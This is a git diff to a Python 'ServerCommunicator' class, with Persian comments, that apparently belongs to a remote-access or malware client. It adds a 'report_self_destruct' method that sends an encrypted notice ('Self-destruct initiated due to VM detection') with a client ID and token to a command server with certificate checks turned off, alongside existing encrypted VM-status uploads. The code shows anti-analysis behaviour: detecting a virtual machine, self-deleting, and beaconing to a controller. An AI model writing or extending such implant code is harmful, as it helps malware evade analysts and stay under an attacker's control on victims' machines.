@@ -1,6 +1,9 @@
 import requests
 import json
 import logging
+import time
+from typing import Dict, List
+from encryption.manager import EncryptionManager
 import gzip
 import base64
 from config import Config
@@ -47,15 +50,11 @@ class ServerCommunicator:
                 logging.error(f"Connection error: {str(e)}")
             raise CommunicationError(f"Connection error: {str(e)}")
 
-    def upload_vm_status(self, vm_details):
-        """
-        ارسال وضعیت VM به سرور.
-        """
+    def upload_vm_status(self, vm_details: Dict) -> Dict:
         try:
             if Config.DEBUG_MODE:
                 logging.info(f"Preparing VM status upload: client_id={self.client_id}")
 
-            # رمزنگاری داده‌های VM
             vm_details_json = json.dumps(vm_details, ensure_ascii=False)
             encrypted_vm_details = self.encryption.encrypt(vm_details_json)
 
@@ -89,6 +88,52 @@ class ServerCommunicator:
             if Config.DEBUG_MODE:
                 logging.error(f"VM status upload error: {str(e)}")
             raise CommunicationError(f"VM status upload error: {str(e)}")
+
+    def report_self_destruct(self) -> Dict:
+        """
+        گزارش حذف خودکار به سرور قبل از خاتمه.
+        """
+        try:
+            if Config.DEBUG_MODE:
+                logging.info(f"Preparing self-destruct report: client_id={self.client_id}")
+
+            report_data = {
+                "message": "Self-destruct initiated due to VM detection",
+                "client_id": self.client_id,
+                "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")
+            }
+            encrypted_report = self.encryption.encrypt(json.dumps(report_data, ensure_ascii=False))
+
+            encrypted_data = {
+                "action": "report_self_destruct",
+                "client_id": self.client_id,
+                "token": self.token,
+                "report": encrypted_report
+            }
+
+            if Config.DEBUG_MODE:
+                logging.info(f"Sending self-destruct report: {encrypted_data}")
+
+            response = requests.post(
+                self.server_url,
+                data=encrypted_data,
+                timeout=Config.COMMAND_TIMEOUT,
+                verify=False
+            )
+
+            if response.status_code != 200:
+                if Config.DEBUG_MODE:
+                    logging.error(f"Self-destruct report failed: status={response.status_code}, response={response.text}")
+                raise CommunicationError(f"Self-destruct report failed: {response.text}")
+
+            if Config.DEBUG_MODE:
+                logging.info("Self-destruct report sent successfully")
+            return response.json()
+
+        except Exception as e:
+            if Config.DEBUG_MODE:
+                logging.error(f"Self-destruct report error: {str(e)}")
+            raise CommunicationError(f"Self-destruct report error: {str(e)}")
 
     def _handle_response(self, response):
         if Config.DEBUG_MODE:
